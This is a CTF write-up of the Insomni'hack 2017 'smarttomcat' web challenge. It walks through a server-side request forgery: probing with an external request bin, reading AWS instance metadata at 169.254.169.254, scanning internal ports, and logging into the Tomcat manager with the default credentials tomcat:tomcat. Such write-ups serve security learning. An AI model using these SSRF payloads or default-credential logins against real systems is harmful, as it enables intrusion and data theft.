---
title: "Insomini'hack 2017 : web50-smarttomcat"
date: "2017-01-30T14:06:19.000Z"
lastmod: "2017-06-05T15:28:40.000Z"
tags: ["ctf", "web security", "ins17"]
slug: "ins17-insominihack-web50-smarttomcat"
url: "/ins17-insominihack-web50-smarttomcat/"
---
Normal, regular cats are so 2000 and late, I decided to buy this allegedly smart tomcat robot   
Now the damn thing has attacked me and flew away. I can't even seem to track it down on the broken search interface... Can you help me? (created by xel/grimmlin)

Search interface: <http://smarttomcat.teaser.insomnihack.ch/>

## Solution

![](/content/images/2017/01/Selection_440.jpg)

The search interface runs a OpenStreetmap Javascript which draw a pin on map and return if the cat is not/found at that lat/long.

Looking at the code we can spot this [out-of-band resource load](https://portswigger.net/KnowledgeBase/issues/Details/00100a00_OutofbandresourceloadHTTP)

![](/content/images/2017/01/Selection_441.jpg)

Tested w/ the payloader `u=http://requestb.in/1hymi8l1&xcoord=123&ycoord=123`

![](/content/images/2017/01/Selection_442.jpg)

```language
X-Request-Id: 51c12305-641c-4601-adbe-9e6543f04d50  
Total-Route-Time: 0  
Host: requestb.in  
Accept-Encoding: gzip  
Cf-Visitor: {"scheme":"http"}  
Connect-Time: 163  
Cf-Ray: 32954978d4e329a5-DUB  
Connection: close  
Via: 1.1 vegur  
Accept: */*  
Cf-Ipcountry: US  
Cf-Connecting-Ip: 34.249.0.154
```

Cool, it do a POST request to any URL we want!

```language
IPINFO  
Hostname     ec2-34-249-0-154.eu-west-1.compute.amazonaws.com  
Network     AS16509 Amazon.com, Inc.  
City     Dublin, Leinster, Ireland  
Latitude/Longitude     53.3389,-6.2595
```

- Of course, tried to find the cat w/ this lat/long.. no success.

### How could it be worse? Server Side Request Forgery (SSRF)

The original request `u=http://localhost:8080/index.jsp?x=15.2833&y=-4.2667` indicates that the script run another local script.

We know this is hosted on Amazon EC2, Amazon uses the internal IP `169.254.169.254` to instance some metadata (a non-routable ip address). New payloader: `u=http://169.254.169.254/?x=15.2833&y=-4.2667`

![](/content/images/2017/01/Selection_245.jpg)

Wow!   
We can leak a lot of shit from server using this!

```
0a:40:f6:f4:83:13  
0=grimmlin  
reservation id r-0e7ba5fead9e79b39  
LoadBalancing  
Admin  
"privateIp" : "172.31.42.51",
"devpayProductCodes" : null,
"availabilityZone" : "eu-west-1a",
"version" : "2010-08-31",
"region" : "eu-west-1",
"instanceId" : "i-07bd01c27725aadb0",
"billingProducts" : null,
"pendingTime" : "2017-01-20T18:20:07Z",
"instanceType" : "t2.medium",
"accountId" : "599063247230",
"architecture" : "x86_64",
"kernelId" : null,
"ramdiskId" : null,
"imageId" : "ami-6f587e1c"
```

With the internal ip we can run a bruteforce ip/port scan internally to find more services..

```
Apache/2.4.18 (Ubuntu) Server at 172.31.42.51 Port 80 (interno)
SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.1 at 172.31.42.51 Port 22 (interno)
```

No lucky, the metadata /userdata is disabled by admin.. Read more about the Amazon EC2 SSRF [here](http://sethsec.blogspot.com.br/2015/12/exploiting-server-side-request-forgery.html).

Will be awesome to extract the flag w/ this "flaw".. but no.. the challenge is much more simpler.

### Tomcat manager

As the original request indicates `u=http://localhost:8080/index.jsp`, we have `Apache Tomcat/7.0.68 (Ubuntu)` running on that machine. The manager role is deprecated, and removed since Tomcat 8, but we have the 7.

`u=http://localhost:8080/manager/html` redirects to Tomcat manager panel..

![](/content/images/2017/01/Selection_249.jpg)

Let's try some Tomcat manager default admin credentials..

Final payload `u=http://tomcat:tomcat@localhost:8080/manager/html?x=15.2833&y=-4.2667`

![](/content/images/2017/03/Selection_999-027-.png)

Flag: **INS{CENSORED}**
